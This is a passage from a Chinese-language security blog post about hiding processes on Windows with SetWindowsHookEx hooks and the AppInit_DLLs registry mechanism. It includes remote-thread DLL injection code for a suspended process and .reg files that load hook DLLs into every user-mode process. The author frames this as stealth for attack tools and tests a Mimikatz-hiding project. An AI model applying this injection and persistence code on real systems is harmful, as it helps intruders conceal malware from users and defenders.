            return 0;
        }
        printf("Success SetWindowHookEx!\n");
        system("pause");;
        UnhookWindowsHookEx(hhook);
        FreeLibrary(hDll);
        printf("Success Unload DLL!\n");
       }
关于为什么这样写，其实我也不是清楚，是我自己调试得到的，具体的话要去看下SetWindowsHook是如何挂钩，如何访问DLL空间，注入程序与被注入程序是如何联系起来的，这些都是底层封装好的，作为一个脚本小子的，能run就行的觉悟，这样写在win10是没错的。
3) 效果展示
Hook的时候很自然、很丝滑，无不适感，近乎无感。  
DLL也被成功加载
Unhook的时候，一切恢复，很nice!  
整体来说这个实现其实已经符合了我的基本要求了，但是这个方法存在一些局限性。
1)Tasklist.exe 没办法挂钩
一般来说，这种只可以挂钩带窗口即有gui的程序，要不然程序里得有信息循环，要不然没办法Hook(就算Hook，也不一定行)，这个就有点美中不足啦，因为我就很喜欢用tasklist来查进程，还有beaconeye这些工具类一般也不会去写gui。
2）DLL需要落地，程序通过参数指定调用DLL的路径时候，commandline也容易暴露，这个问题解决方案就是无DLL文件Hook，跟反射注入差不多，能够做到隐蔽。
### 0x4.2 全局注入 AppInit_DLLs
> 原理:
>
> 用户层，通过global API hooks将测试dll注入到系统的所有进程，实现对指定进程的隐藏
>
> 方式:
>
> 修改注册表键值AppInit_DLLs
>
> 键值位置:
>
> HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows
查阅官方文档:
里面说到支持的平台为:
**Clients** \- Windows 7  
**Servers** \- Windows Server 2008 R2
描述中说到:
> AppInit_DLLs is a mechanism that allows an arbitrary list of DLLs to be
> loaded into each user mode process on the system. Microsoft is modifying the
> AppInit DLLs facility in Windows 7 and Windows Server 2008 R2 to add a new
> code-signing requirement. This will help improve the system reliability and
> performance, as well as improve visibility into the origin of software.
`AppInit_DLLs`支持将一组DLL加载到系统上每个用户模式进程。(这个特点就很有实战意义，针对用户模式注入)
配置信息,用于后面我们编写注册:
这里笔者使用win7作为演示:
win+r -> regedit 打开注册表编辑器
`AppInit_DLLS`： 空格或者逗号隔开,支持短文件名。
`LoadAppInit_DLLS`: 0x1 开启  
`RequireSignedAppInit_DLLs`: 测试的win7没有这个，这里我就不设置了。
然后当你启动任何用户级别程序的时候就会注入DLL:
但是我发现在Win7下的任务管理器有点奇怪，应用程序那一列没办法隐藏应用和tasklist.exe也没办法做到隐藏，但是processHacker在界面还是进程列都没啥问题。
但是确实用户态的所有进程都注入了该DLL，那么问题说明仅仅Hook
`NTQuerySystemInformation`是不够，不同的系统版本然后任务管理器展示可能存在差异。
当时再看国外一篇文章里面说到:
在win2003的时候，hook `NTQuerySystemInformation`结合`AppInit_DLLs`能够实现全方位的隐藏。
后面通过Google搜索到一个现成的github项目::
    Windows Registry Editor Version 5.00
    [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows]
    "AppInit_DLLs"="C:\\Tools\\AppInitHookx64.dll,C:\\Tools\\AppInitHook.dll"
    "LoadAppInit_DLLs"=dword:00000001
    "RequireSignedAppInit_DLLs"=dword:00000000
REG修改下DLL路径，然后项目中修改下隐藏的路径重新编译,得到新的DLL。
点击Reg运行设置好键值，查看效果：
发现一个很神奇的地方，hook表现出来的大部分状态都跟我之前的DLL相同，虽然依然没办法隐藏应用程序中的记事本，但是这个项目Hook之后，能够将Tasklist.exe隐藏掉进程。
为什么会这样的？ 难道TaskList.exe通过其他方式调用了`NTQuerySystemInfoMation`吗?
既然这样，那就尝试验证下window10下的TaskList.exe呗。
写个循环代码尝试捕捉下tasklist.exe的运行:
    // HelloWorld.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
    //
    #include 
    #include 
    #include 
    DWORD GetProcessIDByName(const wchar_t * pName)
    {
        HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (INVALID_HANDLE_VALUE == hSnapshot) {
            return NULL;
        }
        PROCESSENTRY32 pe = { sizeof(pe) };
        for (BOOL ret = Process32First(hSnapshot, &pe); ret; ret = Process32Next(hSnapshot, &pe)) {
            if (wcscmp(pe.szExeFile, pName) == 0) {
                CloseHandle(hSnapshot);
                return pe.th32ProcessID;
            }
        }
        CloseHandle(hSnapshot);
        return 0;
    }
    int main()
    {
        while (true) {
            DWORD result = GetProcessIDByName(TEXT("tasklist.exe"));
            if (!result) {
                printf("Not Found tasklist.exe\n");
            }
            else {
                printf("Found tasklist.exe Done! breaking circle\n");
                break;
            }
        }
    }
好像还不错，这么快也能捕捉到。
那么尝试下，瞬间注入呗？ em？ 好像不太OK
经过我的一番脚本小子的推测，可能是注入的瞬间进程结束了呗，那么有没有啥办法能检验呢？
随手搓一个挂起注入呗，看看能不能解决这个问题。
    STARTUPINFO si = { 0 };
        PROCESS_INFORMATION pi = { 0 };
        wchar_t exe_path[] = TEXT("C:\\Windows\\System32\\tasklist.exe");
        if (!CreateProcess(NULL, exe_path, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
            return 1;
        }
        printf("pid: %d suspended process Succeed!\n", pi.dwProcessId);
        wchar_t tPath[] = TEXT("C:\\Users\\god\\Desktop\\AppInitGlobalHooks-Mimikatz-master\\x64\\Release\\AppInitHook.dll");
        LPVOID remoteAllocAddr = VirtualAllocEx(pi.hProcess, NULL, sizeof tPath, MEM_COMMIT, PAGE_READWRITE);
        BOOL writeRet = WriteProcessMemory(pi.hProcess, remoteAllocAddr, (LPVOID)tPath, sizeof tPath, NULL);
        HMODULE hModule = GetModuleHandle(TEXT("kernel32.dll"));
        LPTHREAD_START_ROUTINE dwLoadAddr = (PTHREAD_START_ROUTINE)GetProcAddress(hModule, "LoadLibraryW");
        HANDLE  hThread = CreateRemoteThread(pi.hProcess, NULL, 0, dwLoadAddr, remoteAllocAddr, 0, NULL);
        if (hThread == NULL) {
            printf("[-] CreatRemoteTread error! \n");
        }
        else {
            printf("[+] Succeed!\n");
        }
        system("pause");
        // wake 
        if (ResumeThread(pi.hThread) == -1) {
            printf( "ResumeThread failed; error code = 0x%08X\n", GetLastError());
            return 1;
        }
问题不大成功注入DLL，但是我发现唤醒主线程之后依然没办法隐藏进程，后面想知道为什么只能动态去调试了，一想到脚本小子的本分，我就知道这对我来说是不可能的了。
这里给出点自己的想法，要么就是Tasklist实现机制问题，要么就是注入的时候Hook优先级不够。
顺便补充一个相关知识点，关于这个技术的通用性拓展,三好学生师傅针对32位和64位做了改动来适配:
    Windows Registry Editor Version 5.00
    [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows]
    "AppInit_DLLs"="C:\\Tools\\AppInitHookx64.dll"
    "LoadAppInit_DLLs"=dword:00000001
    "RequireSignedAppInit_DLLs"=dword:00000000
    [HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows]
    "AppInit_DLLs"="C:\\Tools\\AppInitHook.dll"
    "LoadAppInit_DLLs"=dword:00000001
    "RequireSignedAppInit_DLLs"=dword:00000000
最后，小结下，虽然这个方法使用起来很简单，效果很明显，但是其也有很严重的局限性:
1）由于借助系统加载，DLL文件肯定是要落地的。
2）微软在其文档中提到:
很有意思，目前这个方法被恶意软件广泛使用，自window8之后，使用了安全启动，这样会默认关闭`Appinit_DLLS`技术。
可能是利用起来太简单了，可以自定义各种设置，病毒开发小伙伴们都是很有默契的，要么一起用，要么一起不用，那微软就成全后者呗。
## 0x5 个人想法
本文算是帮不少作者填了一些坑，但是笔者同样也留了一些新坑，天道好轮回，苍天饶过谁？
关于这个基于window机制来实现对抗的思路，还是有一定可玩性的，除了进程隐藏，还有很多玩法。在日常对抗中的，防御的成本是高于攻击成本的，你玩的越底层，那么他们的防御成本是指数级别增长。同时，要做好一个攻击工具，是需要做到良好兼容性、傻瓜化、工程化的。
## 0x6 总结
本文是一篇属于流水账式的文章，通过开门见山点出全局Hook的两个思路，然后介绍了如何上手使用`Mhook`来简化Hook的编码过程，接着介绍了隐藏进程的原理，并做了效果展示，最后较为详细地介绍了笔者实现全局钩子和全局注入的过程。通过阅读本文，读者可以清楚看到笔者是个纯粹的脚本小子，其中很多想法不具备底层原理的考证，所以建议抱谨慎的态度阅读此文，同时欢迎各位师傅拍砖指点，指出错误之处。
## 0x7 参考链接
[Hook Heaps and Live Free](https://www.arashparsa.com/hook-heaps-and-live-free/)  
[Easy way to set up global API
hooks](https://www.codeproject.com/articles/49319/easy-way-to-set-up-global-api-hooks?display=print)  
[利用globalAPIhooks在Win7系统下隐藏进程](https://3gstudent.github.io/%E5%88%A9%E7%94%A8globalAPIhooks%E5%9C%A8Win7%E7%B3%BB%E7%BB%9F%E4%B8%8B%E9%9A%90%E8%97%8F%E8%BF%9B%E7%A8%8B)  
[代码参考](https://github.com/manicstreetcoders/AppInitGlobalHooks-Mimikatz)  
[ProcessHider利用分析](https://cloud.tencent.com/developer/article/1594779)  
[ssdt-hook 进程隐藏与保护](https://www.mashen.zone/thread-3100270.htm)  
[Windows Hook原理与实现](http://www.tnblog.net/18785819686/article/details/5480)  
[结构体查询网站](http://terminus.rewolf.pl/terminus/)  
[Windows黑客编程技术详解](https://www.liangzl.com/get-article-detail-192058.html)  
[《逆向工程核心原理》-- Windows消息钩取](https://zhuanlan.zhihu.com/p/124240880)  
[全局钩子注入](https://www.write-bug.com/article/2028.html)  
[3环下进程隐藏------持续隐藏防新开](https://www.daimajiaoliu.com/daima/476281743900414)  
[基于TaskKill命令防杀的进程保护](https://4hou.win/wordpress/?p=18929)